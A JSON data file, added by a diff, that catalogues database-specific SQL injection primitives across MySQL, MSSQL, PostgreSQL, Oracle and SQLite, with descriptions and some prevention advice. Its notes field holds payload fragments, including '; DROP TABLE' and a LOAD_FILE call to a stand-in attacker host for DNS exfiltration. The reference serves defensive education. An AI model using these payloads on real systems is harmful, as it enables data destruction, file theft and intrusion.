@@ -1,0 +1,81 @@
+{
+  "id": "database_injection",
+  "title": "Database-Specific Injection",
+  "description": "Database-specific primitives that can amplify an injection flaw.",
+  "icon_key": "injection",
+  "attacks": [
+    {
+      "name": "Stacked queries",
+      "notes": "; DROP TABLE, ; SELECT",
+      "desc": "Allowing multiple statements in one SQL input can turn one injection point into additional database operations.",
+      "prevention": "Use parameterized queries and disable multi-statement execution where the driver supports it."
+    },
+    {
+      "name": "LOAD_FILE()",
+      "notes": "MySQL file read",
+      "desc": "MySQL's LOAD_FILE can read server-side files when permissions and injection context allow it.",
+      "prevention": "Use a least-privilege database account without file-read permissions, and eliminate the injection path."
+    },
+    {
+      "name": "INTO OUTFILE",
+      "notes": "MySQL file write",
+      "desc": "MySQL's INTO OUTFILE can write query output to a server-side file when the account has sufficient privileges.",
+      "prevention": "Remove file-write privileges from application accounts and keep query values bound as data."
+    },
+    {
+      "name": "xp_cmdshell",
+      "notes": "MSSQL RCE",
+      "desc": "SQL Server's xp_cmdshell can invoke operating-system commands if enabled and reachable through an injection path.",
+      "prevention": "Disable xp_cmdshell unless indispensable, restrict privileged SQL roles, and parameterize application queries."
+    },
+    {
+      "name": "MSSQL stacked + EXEC",
+      "notes": "",
+      "desc": "Stacked SQL Server statements can call EXEC or other operations beyond the intended query.",
+      "prevention": null
+    },
+    {
+      "name": "Postgres COPY ... FROM PROGRAM",
+      "notes": "RCE",
+      "desc": "PostgreSQL's COPY FROM PROGRAM can execute a server-side program when the database role has the required privileges.",
+      "prevention": null
+    },
+    {
+      "name": "Postgres large object read",
+      "notes": "lo_import",
+      "desc": "PostgreSQL large-object functions can expose server-side file content when privileged functions are reachable.",
+      "prevention": null
+    },
+    {
+      "name": "Oracle UTL_HTTP / UTL_FILE",
+      "notes": "OOB + file",
+      "desc": "Oracle UTL_HTTP and UTL_FILE can reach network or file resources when grants and injection context permit it.",
+      "prevention": null
+    },
+    {
+      "name": "SQLite file read",
+      "notes": "readfile()",
+      "desc": "SQLite file-reading extensions or functions can expose local files if enabled in the application environment.",
+      "prevention": null
+    },
+    {
+      "name": "MySQL error-based (EXTRACTVALUE)",
+      "notes": "",
+      "desc": "MySQL error messages from XML-related functions can disclose query results in affected versions and configurations.",
+      "prevention": null
+    },
+    {
+      "name": "Time-based per-DB payloads",
+      "notes": "SLEEP, PG_SLEEP, WAITFOR",
+      "desc": "Database-specific delay functions can reveal query truth through response timing when direct output is unavailable.",
+      "prevention": null
+    },
+    {
+      "name": "OOB DNS exfil",
+      "notes": "LOAD_FILE('\\\\\\\\attacker\\\\x')",
+      "desc": "A database feature that performs network lookups can leak data through DNS when reachable from an injection point.",
+      "prevention": null
+    }
+  ],
+  "order": 22
+}
